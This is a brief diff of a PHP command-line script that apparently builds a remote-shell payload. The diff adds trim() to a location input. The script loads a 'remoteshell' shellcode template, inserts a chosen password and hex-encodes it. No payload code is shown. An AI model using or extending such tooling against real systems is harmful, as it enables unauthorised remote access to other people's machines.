@@ -8,7 +8,7 @@ fclose($inputs);
 echo "Set Location save: ";
 $inputs = fopen("php://stdin","r");
 $input = fgets($inputs);
-   $location = $input;
+   $location = trim($input);
    $body = file_get_contents("shellcode/remoteshell.code", true);
    $body = str_replace("password_change", $password, $body);
    $body = bin2hex($body);
